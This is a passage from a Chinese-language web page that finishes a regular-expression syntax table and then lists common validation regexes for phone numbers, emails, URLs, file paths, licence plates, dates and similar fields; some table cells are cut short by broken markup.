</tr>
<tr>
<td align="left"><code>?</code></td>
<td align="left">当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，’o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。</td>
</tr>
<tr>
<td align="left"><code>.</code></td>
<td align="left">匹配除换行符（\n、\r）之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用像”(.</td>
</tr>
<tr>
<td align="left"><code>(pattern)</code></td>
<td align="left">匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘(‘ 或 ‘)‘。</td>
</tr>
<tr>
<td align="left"><code>(?:pattern)</code></td>
<td align="left">匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (</td>
</tr>
<tr>
<td align="left"><code>(?=pattern)</code></td>
<td align="left">正向肯定预查（look ahead positive assert），在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，”Windows(?=95</td>
</tr>
<tr>
<td align="left"><code>(?!pattern)</code></td>
<td align="left">正向否定预查(negative assert)，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如”Windows(?!95</td>
</tr>
<tr>
<td align="left"><code>(?&lt;=pattern)</code></td>
<td align="left">反向(look behind)肯定预查，与正向肯定预查类似，只是方向相反。例如，”(?&lt;=95</td>
</tr>
<tr>
<td align="left"><code>(?&lt;!pattern)</code></td>
<td align="left">反向否定预查，与正向否定预查类似，只是方向相反。例如”(?&lt;!95</td>
</tr>
<tr>
<td align="left"><code>x|y</code></td>
<td align="left">匹配 x 或 y。例如，’z</td>
</tr>
<tr>
<td align="left"><code>[xyz]</code></td>
<td align="left">字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。</td>
</tr>
<tr>
<td align="left"><code>[^xyz]</code></td>
<td align="left">负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’、’l’、’i’、’n’。</td>
</tr>
<tr>
<td align="left"><code>[a-z]</code></td>
<td align="left">字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。</td>
</tr>
<tr>
<td align="left"><code>[^a-z]</code></td>
<td align="left">负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。</td>
</tr>
<tr>
<td align="left"><code>\b</code></td>
<td align="left">匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。</td>
</tr>
<tr>
<td align="left"><code>\B</code></td>
<td align="left">匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。</td>
</tr>
<tr>
<td align="left"><code>\cx</code></td>
<td align="left">匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td>
</tr>
<tr>
<td align="left"><code>\d</code></td>
<td align="left">匹配一个数字字符。等价于 [0-9]。</td>
</tr>
<tr>
<td align="left"><code>\D</code></td>
<td align="left">匹配一个非数字字符。等价于 [^0-9]。</td>
</tr>
<tr>
<td align="left"><code>\f</code></td>
<td align="left">匹配一个换页符。等价于 \x0c 和 \cL。</td>
</tr>
<tr>
<td align="left"><code>\n</code></td>
<td align="left">匹配一个换行符。等价于 \x0a 和 \cJ。</td>
</tr>
<tr>
<td align="left"><code>\r</code></td>
<td align="left">匹配一个回车符。等价于 \x0d 和 \cM。</td>
</tr>
<tr>
<td align="left"><code>\s</code></td>
<td align="left">匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</td>
</tr>
<tr>
<td align="left"><code>\S</code></td>
<td align="left">匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</td>
</tr>
<tr>
<td align="left"><code>\t</code></td>
<td align="left">匹配一个制表符。等价于 \x09 和 \cI。</td>
</tr>
<tr>
<td align="left"><code>\v</code></td>
<td align="left">匹配一个垂直制表符。等价于 \x0b 和 \cK。</td>
</tr>
<tr>
<td align="left"><code>\w</code></td>
<td align="left">匹配字母、数字、下划线。等价于’[A-Za-z0-9_]’。</td>
</tr>
<tr>
<td align="left"><code>\W</code></td>
<td align="left">匹配非字母、数字、下划线。等价于 ‘[^A-Za-z0-9_]’。</td>
</tr>
<tr>
<td align="left"><code>\xn</code></td>
<td align="left">匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41’ 匹配 “A”。’\x041’ 则等价于 ‘\x04’ &amp; “1”。正则表达式中可以使用 ASCII 编码。</td>
</tr>
<tr>
<td align="left"><code>\num</code></td>
<td align="left">匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1’ 匹配两个连续的相同字符。</td>
</tr>
<tr>
<td align="left"><code>\n</code></td>
<td align="left">标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。</td>
</tr>
<tr>
<td align="left"><code>\nm</code></td>
<td align="left">标识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。</td>
</tr>
<tr>
<td align="left"><code>\nml</code></td>
<td align="left">如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。</td>
</tr>
<tr>
<td align="left"><code>\un</code></td>
<td align="left">匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。</td>
</tr>
</tbody></table>
<h3 id="常用正则"><a href="#常用正则" class="headerlink" title="常用正则"></a>常用正则</h3><h4 id="汉字"><a href="#汉字" class="headerlink" title="汉字"></a>汉字</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/[\u4e00-\u9fa5]/</span><br></pre></td></tr></table></figure>

<h4 id="手机"><a href="#手机" class="headerlink" title="手机"></a>手机</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^<span class="number">1</span>[<span class="number">3</span><span class="number">-9</span>]\d&#123;<span class="number">9</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^<span class="number">1</span>(<span class="number">3</span>[<span class="number">4</span><span class="number">-9</span>]\|<span class="number">47</span>\|<span class="number">5</span>[<span class="number">012789</span>]\|<span class="number">78</span>\|<span class="number">8</span>[<span class="number">23478</span>])\d&#123;<span class="number">8</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="联通"><a href="#联通" class="headerlink" title="联通"></a>联通</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^<span class="number">1</span>(<span class="number">3</span>[<span class="number">0</span><span class="number">-2</span>]\|<span class="number">5</span>[<span class="number">56</span>]\|<span class="number">8</span>[<span class="number">56</span>]\|<span class="number">76</span>)\d&#123;<span class="number">8</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="电信"><a href="#电信" class="headerlink" title="电信"></a>电信</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^<span class="number">1</span>(<span class="number">33</span>\|<span class="number">53</span>\|<span class="number">8</span>[<span class="number">019</span>]\|<span class="number">77</span>)\d&#123;<span class="number">8</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/\w[-\w.+]*@([A-Za-z0<span class="number">-9</span>][-A-Za-z0<span class="number">-9</span>]+\.)+[A-Za-z]&#123;<span class="number">2</span>,<span class="number">14</span>&#125;/</span><br></pre></td></tr></table></figure>

<h4 id="火车车次"><a href="#火车车次" class="headerlink" title="火车车次"></a>火车车次</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[GCDZTSPKXLY1<span class="number">-9</span>]\d&#123;<span class="number">1</span>,<span class="number">4</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="手机机身码-IMEI"><a href="#手机机身码-IMEI" class="headerlink" title="手机机身码(IMEI)"></a>手机机身码(IMEI)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^\d&#123;<span class="number">15</span>,<span class="number">17</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="必须带端口号的网址-或ip"><a href="#必须带端口号的网址-或ip" class="headerlink" title="必须带端口号的网址(或ip)"></a>必须带端口号的网址(或ip)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^((ht|f)tps?:\/\/)?[\w-]+(\.[\w-]+)+:\d&#123;<span class="number">1</span>,<span class="number">5</span>&#125;\/?$/</span><br></pre></td></tr></table></figure>

<h4 id="网址-URL"><a href="#网址-URL" class="headerlink" title="网址(URL)"></a>网址(URL)</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">/^(((ht|f)tps?):\/\/)?([^!@#$%^&amp;*?.\s-]([^!@#$%^&amp;*?.\s]&#123;0,63&#125;[^!@#$%^&amp;*?.\s])?\.)+[a-z]&#123;2,6&#125;\/?/</span><br></pre></td></tr></table></figure>

<h4 id="统一社会信用代码"><a href="#统一社会信用代码" class="headerlink" title="统一社会信用代码"></a>统一社会信用代码</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[<span class="number">0</span><span class="number">-9</span>A-HJ-NPQRTUWXY]&#123;<span class="number">2</span>&#125;\d&#123;<span class="number">6</span>&#125;[<span class="number">0</span><span class="number">-9</span>A-HJ-NPQRTUWXY]&#123;<span class="number">10</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="统一社会信用代码-宽松匹配-15位-18位-20位数字-字母"><a href="#统一社会信用代码-宽松匹配-15位-18位-20位数字-字母" class="headerlink" title="统一社会信用代码(宽松匹配)(15位/18位/20位数字/字母)"></a>统一社会信用代码(宽松匹配)(15位/18位/20位数字/字母)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(([<span class="number">0</span><span class="number">-9</span>A-Za-z]&#123;<span class="number">15</span>&#125;)|([<span class="number">0</span><span class="number">-9</span>A-Za-z]&#123;<span class="number">18</span>&#125;)|([<span class="number">0</span><span class="number">-9</span>A-Za-z]&#123;<span class="number">20</span>&#125;))$/</span><br></pre></td></tr></table></figure>

<h4 id="迅雷链接"><a href="#迅雷链接" class="headerlink" title="迅雷链接"></a>迅雷链接</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^thunderx?:\/\/[a-zA-Z\d]+=$/</span><br></pre></td></tr></table></figure>

<h4 id="ed2k链接-宽松匹配"><a href="#ed2k链接-宽松匹配" class="headerlink" title="ed2k链接(宽松匹配)"></a>ed2k链接(宽松匹配)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^ed2k:\/\/\|file\|.+\|\/$/</span><br></pre></td></tr></table></figure>

<h4 id="磁力链接-宽松匹配"><a href="#磁力链接-宽松匹配" class="headerlink" title="磁力链接(宽松匹配)"></a>磁力链接(宽松匹配)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^magnet:\?xt=urn:btih:[<span class="number">0</span><span class="number">-9</span>a-fA-F]&#123;<span class="number">40</span>,&#125;.*$/</span><br></pre></td></tr></table></figure>

<h4 id="子网掩码-不包含-0-0-0-0"><a href="#子网掩码-不包含-0-0-0-0" class="headerlink" title="子网掩码(不包含 0.0.0.0)"></a>子网掩码(不包含 0.0.0.0)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(<span class="number">254</span>|<span class="number">252</span>|<span class="number">248</span>|<span class="number">240</span>|<span class="number">224</span>|<span class="number">192</span>|<span class="number">128</span>)\<span class="number">.0</span>\<span class="number">.0</span>\<span class="number">.0</span>|<span class="number">255</span>\.(<span class="number">254</span>|<span class="number">252</span>|<span class="number">248</span>|<span class="number">240</span>|<span class="number">224</span>|<span class="number">192</span>|<span class="number">128</span>|<span class="number">0</span>)\<span class="number">.0</span>\<span class="number">.0</span>|<span class="number">255</span>\<span class="number">.255</span>\.(<span class="number">254</span>|<span class="number">252</span>|<span class="number">248</span>|<span class="number">240</span>|<span class="number">224</span>|<span class="number">192</span>|<span class="number">128</span>|<span class="number">0</span>)\<span class="number">.0</span>|<span class="number">255</span>\<span class="number">.255</span>\<span class="number">.255</span>\.(<span class="number">255</span>|<span class="number">254</span>|<span class="number">252</span>|<span class="number">248</span>|<span class="number">240</span>|<span class="number">224</span>|<span class="number">192</span>|<span class="number">128</span>|<span class="number">0</span>)$/</span><br></pre></td></tr></table></figure>

<h4 id="linux”隐藏文件”路径"><a href="#linux”隐藏文件”路径" class="headerlink" title="linux”隐藏文件”路径"></a>linux”隐藏文件”路径</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^\/(?:[^<span class="regexp">/]+\/)*\.[^/]*/</span></span><br></pre></td></tr></table></figure>

<h4 id="linux文件夹路径"><a href="#linux文件夹路径" class="headerlink" title="linux文件夹路径"></a>linux文件夹路径</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^\/(?:[^<span class="regexp">/]+\/)*$/</span></span><br></pre></td></tr></table></figure>

<h4 id="linux文件路径"><a href="#linux文件路径" class="headerlink" title="linux文件路径"></a>linux文件路径</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^\/(?:[^<span class="regexp">/]+\/)*[^/]+$/</span></span><br></pre></td></tr></table></figure>

<h4 id="window”文件夹”路径"><a href="#window”文件夹”路径" class="headerlink" title="window”文件夹”路径"></a>window”文件夹”路径</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[a-zA-Z]:\\(?:\w+\\?)*$/</span><br></pre></td></tr></table></figure>

<h4 id="window下”文件”路径"><a href="#window下”文件”路径" class="headerlink" title="window下”文件”路径"></a>window下”文件”路径</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[a-zA-Z]:\\(?:\w+\\)*\w+\.\w+$/</span><br></pre></td></tr></table></figure>

<h4 id="股票代码-A股"><a href="#股票代码-A股" class="headerlink" title="股票代码(A股)"></a>股票代码(A股)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(s[hz]|S[HZ])(<span class="number">000</span>[\d]&#123;<span class="number">3</span>&#125;|<span class="number">002</span>[\d]&#123;<span class="number">3</span>&#125;|<span class="number">300</span>[\d]&#123;<span class="number">3</span>&#125;|<span class="number">600</span>[\d]&#123;<span class="number">3</span>&#125;|<span class="number">60</span>[\d]&#123;<span class="number">4</span>&#125;)$/</span><br></pre></td></tr></table></figure>

<h4 id="大于等于0-小于等于150-支持小数位出现5-如145-5-用于判断考卷分数"><a href="#大于等于0-小于等于150-支持小数位出现5-如145-5-用于判断考卷分数" class="headerlink" title="大于等于0, 小于等于150, 支持小数位出现5, 如145.5, 用于判断考卷分数"></a>大于等于0, 小于等于150, 支持小数位出现5, 如145.5, 用于判断考卷分数</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^<span class="number">150</span>$|^(?:\d|[<span class="number">1</span><span class="number">-9</span>]\d|<span class="number">1</span>[<span class="number">0</span><span class="number">-4</span>]\d)(?:\<span class="number">.5</span>)?$/</span><br></pre></td></tr></table></figure>

<h4 id="html注释"><a href="#html注释" class="headerlink" title="html注释"></a>html注释</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/<span class="xml"><span class="comment">&lt;!--[\s\S]*?--&gt;</span>/g</span></span><br></pre></td></tr></table></figure>

<h4 id="md5格式-32位"><a href="#md5格式-32位" class="headerlink" title="md5格式(32位)"></a>md5格式(32位)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[a-fA-F0<span class="number">-9</span>]&#123;<span class="number">32</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="GUID-UUID"><a href="#GUID-UUID" class="headerlink" title="GUID/UUID"></a>GUID/UUID</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[a-f\d]&#123;<span class="number">4</span>&#125;(?:[a-f\d]&#123;<span class="number">4</span>&#125;-)&#123;<span class="number">4</span>&#125;[a-f\d]&#123;<span class="number">12</span>&#125;$/i</span><br></pre></td></tr></table></figure>

<h4 id="版本号-version-格式必须为X-Y-Z"><a href="#版本号-version-格式必须为X-Y-Z" class="headerlink" title="版本号(version)格式必须为X.Y.Z"></a>版本号(version)格式必须为X.Y.Z</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^\d+(?:\.\d+)&#123;<span class="number">2</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="视频-video-链接地址（视频格式可按需增删）"><a href="#视频-video-链接地址（视频格式可按需增删）" class="headerlink" title="视频(video)链接地址（视频格式可按需增删）"></a>视频(video)链接地址（视频格式可按需增删）</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^https?:\/\/(.+\/)+.+(\.(swf|avi|flv|mpg|rm|mov|wav|asf|<span class="number">3</span>gp|mkv|rmvb|mp4))$/i</span><br></pre></td></tr></table></figure>

<h4 id="图片-image-链接地址（图片格式可按需增删）"><a href="#图片-image-链接地址（图片格式可按需增删）" class="headerlink" title="图片(image)链接地址（图片格式可按需增删）"></a>图片(image)链接地址（图片格式可按需增删）</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^https?:\/\/(.+\/)+.+(\.(gif|png|jpg|jpeg|webp|svg|psd|bmp|tif))$/i</span><br></pre></td></tr></table></figure>

<h4 id="24小时制时间（HH-mm-ss）"><a href="#24小时制时间（HH-mm-ss）" class="headerlink" title="24小时制时间（HH:mm:ss）"></a>24小时制时间（HH:mm:ss）</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(?:[<span class="number">01</span>]\d|<span class="number">2</span>[<span class="number">0</span><span class="number">-3</span>]):[<span class="number">0</span><span class="number">-5</span>]\d:[<span class="number">0</span><span class="number">-5</span>]\d$/</span><br></pre></td></tr></table></figure>

<h4 id="12小时制时间（hh-mm-ss）"><a href="#12小时制时间（hh-mm-ss）" class="headerlink" title="12小时制时间（hh:mm:ss）"></a>12小时制时间（hh:mm:ss）</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(?:<span class="number">1</span>[<span class="number">0</span><span class="number">-2</span>]|<span class="number">0</span>?[<span class="number">1</span><span class="number">-9</span>]):[<span class="number">0</span><span class="number">-5</span>]\d:[<span class="number">0</span><span class="number">-5</span>]\d$/</span><br></pre></td></tr></table></figure>

<h4 id="base64格式"><a href="#base64格式" class="headerlink" title="base64格式"></a>base64格式</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^\s*data:(?:[a-z]+\/[a-z0<span class="number">-9</span>-+.]+(?:;[a-z-]+=[a-z0<span class="number">-9</span>-]+)?)?(?:;base64)?,([a-z0<span class="number">-9</span>!$&amp;<span class="string">',()*+;=\-._~:@/?%\s]*?)\s*$/i</span></span><br></pre></td></tr></table></figure>

<h4 id="数字-货币金额（支持负数、千分位分隔符）"><a href="#数字-货币金额（支持负数、千分位分隔符）" class="headerlink" title="数字/货币金额（支持负数、千分位分隔符）"></a>数字/货币金额（支持负数、千分位分隔符）</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^-?\d+(,\d&#123;<span class="number">3</span>&#125;)*(\.\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;)?$/</span><br></pre></td></tr></table></figure>

<h4 id="数字-货币金额-只支持正数、不支持校验千分位分隔符"><a href="#数字-货币金额-只支持正数、不支持校验千分位分隔符" class="headerlink" title="数字/货币金额 (只支持正数、不支持校验千分位分隔符)"></a>数字/货币金额 (只支持正数、不支持校验千分位分隔符)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/(?:^[<span class="number">1</span><span class="number">-9</span>]([<span class="number">0</span><span class="number">-9</span>]+)?(?:\.[<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">2</span>&#125;)?$)|(?:^(?:<span class="number">0</span>)$)|(?:^[<span class="number">0</span><span class="number">-9</span>]\.[<span class="number">0</span><span class="number">-9</span>](?:[<span class="number">0</span><span class="number">-9</span>])?$)/</span><br></pre></td></tr></table></figure>

<h4 id="银行卡号（10到30位-覆盖对公-私账户-参考微信支付）"><a href="#银行卡号（10到30位-覆盖对公-私账户-参考微信支付）" class="headerlink" title="银行卡号（10到30位, 覆盖对公/私账户, 参考微信支付）"></a>银行卡号（10到30位, 覆盖对公/私账户, 参考<a href="https://pay.weixin.qq.com/wiki/doc/api/xiaowei.php?chapter=22_1" target="_blank" rel="noopener">微信支付</a>）</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[<span class="number">1</span><span class="number">-9</span>]\d&#123;<span class="number">9</span>,<span class="number">29</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="中文姓名"><a href="#中文姓名" class="headerlink" title="中文姓名"></a>中文姓名</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(?:[\u4e00-\u9fa5·]&#123;<span class="number">2</span>,<span class="number">16</span>&#125;)$/</span><br></pre></td></tr></table></figure>

<h4 id="英文姓名"><a href="#英文姓名" class="headerlink" title="英文姓名"></a>英文姓名</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/(^[a-zA-Z][a-zA-Z\s]&#123;<span class="number">0</span>,<span class="number">20</span>&#125;[a-zA-Z]$)/</span><br></pre></td></tr></table></figure>

<h4 id="车牌号-新能源"><a href="#车牌号-新能源" class="headerlink" title="车牌号(新能源)"></a>车牌号(新能源)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领][A-HJ-NP-Z](?:((\d&#123;<span class="number">5</span>&#125;[A-HJK])|([A-HJK][A-HJ-NP-Z0<span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">4</span>&#125;))|[A-HJ-NP-Z0<span class="number">-9</span>]&#123;<span class="number">4</span>&#125;[A-HJ-NP-Z0<span class="number">-9</span>挂学警港澳])$/</span><br></pre></td></tr></table></figure>

<h4 id="车牌号-非新能源"><a href="#车牌号-非新能源" class="headerlink" title="车牌号(非新能源)"></a>车牌号(非新能源)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领][A-HJ-NP-Z][A-HJ-NP-Z0<span class="number">-9</span>]&#123;<span class="number">4</span>&#125;[A-HJ-NP-Z0<span class="number">-9</span>挂学警港澳]$/</span><br></pre></td></tr></table></figure>

<h4 id="车牌号-新能源-非新能源"><a href="#车牌号-新能源-非新能源" class="headerlink" title="车牌号(新能源+非新能源)"></a>车牌号(新能源+非新能源)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^[京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领][A-HJ-NP-Z][A-HJ-NP-Z0<span class="number">-9</span>]&#123;<span class="number">4</span>,<span class="number">5</span>&#125;[A-HJ-NP-Z0<span class="number">-9</span>挂学警港澳]$/</span><br></pre></td></tr></table></figure>

<h4 id="手机号-mobile-phone-中国-严谨-根据工信部2019年最新公布的手机号段"><a href="#手机号-mobile-phone-中国-严谨-根据工信部2019年最新公布的手机号段" class="headerlink" title="手机号(mobile phone)中国(严谨), 根据工信部2019年最新公布的手机号段"></a>手机号(mobile phone)中国(严谨), 根据工信部2019年最新公布的手机号段</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(?:(?:\+|<span class="number">00</span>)<span class="number">86</span>)?<span class="number">1</span>(?:(?:<span class="number">3</span>[\d])|(?:<span class="number">4</span>[<span class="number">5</span><span class="number">-79</span>])|(?:<span class="number">5</span>[<span class="number">0</span><span class="number">-35</span><span class="number">-9</span>])|(?:<span class="number">6</span>[<span class="number">5</span><span class="number">-7</span>])|(?:<span class="number">7</span>[<span class="number">0</span><span class="number">-8</span>])|(?:<span class="number">8</span>[\d])|(?:<span class="number">9</span>[<span class="number">189</span>]))\d&#123;<span class="number">8</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="手机号-mobile-phone-中国-宽松-只要是13-14-15-16-17-18-19开头即可"><a href="#手机号-mobile-phone-中国-宽松-只要是13-14-15-16-17-18-19开头即可" class="headerlink" title="手机号(mobile phone)中国(宽松), 只要是13,14,15,16,17,18,19开头即可"></a>手机号(mobile phone)中国(宽松), 只要是13,14,15,16,17,18,19开头即可</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(?:(?:\+|<span class="number">00</span>)<span class="number">86</span>)?<span class="number">1</span>[<span class="number">3</span><span class="number">-9</span>]\d&#123;<span class="number">9</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="手机号-mobile-phone-中国-最宽松-只要是1开头即可-如果你的手机号是用来接收短信-优先建议选择这一条"><a href="#手机号-mobile-phone-中国-最宽松-只要是1开头即可-如果你的手机号是用来接收短信-优先建议选择这一条" class="headerlink" title="手机号(mobile phone)中国(最宽松), 只要是1开头即可, 如果你的手机号是用来接收短信, 优先建议选择这一条"></a>手机号(mobile phone)中国(最宽松), 只要是1开头即可, 如果你的手机号是用来接收短信, 优先建议选择这一条</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(?:(?:\+|<span class="number">00</span>)<span class="number">86</span>)?<span class="number">1</span>\d&#123;<span class="number">10</span>&#125;$/</span><br></pre></td></tr></table></figure>

<h4 id="日期-宽松"><a href="#日期-宽松" class="headerlink" title="日期(宽松)"></a>日期(宽松)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^\d&#123;<span class="number">1</span>,<span class="number">4</span>&#125;(-)(<span class="number">1</span>[<span class="number">0</span><span class="number">-2</span>]|<span class="number">0</span>?[<span class="number">1</span><span class="number">-9</span>])\<span class="number">1</span>(<span class="number">0</span>?[<span class="number">1</span><span class="number">-9</span>]|[<span class="number">1</span><span class="number">-2</span>]\d|<span class="number">30</span>|<span class="number">31</span>)$/</span><br></pre></td></tr></table></figure>

<h4 id="日期-严谨-支持闰年判断"><a href="#日期-严谨-支持闰年判断" class="headerlink" title="日期(严谨, 支持闰年判断)"></a>日期(严谨, 支持闰年判断)</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">/^(([<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">3</span>&#125;[<span class="number">1</span><span class="number">-9</span>]|[<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">2</span>&#125;[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">1</span>&#125;|[<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">1</span>&#125;[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">2</span>&#125;|[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">3</span>&#125;)-(((<span class="number">0</span>[<span class="number">13578</span>]|<span class="number">1</span>[<span class="number">02</span>])-(<span class="number">0</span>[<span class="number">1</span><span class="number">-9</span>]|[<span class="number">12</span>][<span class="number">0</span><span class="number">-9</span>]|<span class="number">3</span>[<span class="number">01</span>]))|((<span class="number">0</span>[<span class="number">469</span>]|<span class="number">11</span>)-(<span class="number">0</span>[<span class="number">1</span><span class="number">-9</span>]|[<span class="number">12</span>][<span class="number">0</span><span class="number">-9</span>]|<span class="number">30</span>))|(<span class="number">02</span>-(<span class="number">0</span>[<span class="number">1</span><span class="number">-9</span>]|[<span class="number">1</span>][<span class="number">0</span><span class="number">-9</span>]|<span class="number">2</span>[<span class="number">0</span><span class="number">-8</span>]))))|((([<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">2</span>&#125;)(<span class="number">0</span>[<span class="number">48</span>]|[<span class="number">2468</span>][<span class="number">048</span>]|[<span class="number">13579</span>][<span class="number">26</span>])|((<span class="number">0</span>[<span class="number">48</span>]|[<span class="number">2468</span>][<span class="number">048</span>]|[<span class="number">3579</span>][<span class="number">26</span>])<span class="number">00</span>))<span class="number">-02</span><span class="number">-29</span>)$/</span><br></pre></td></tr></table></figure>

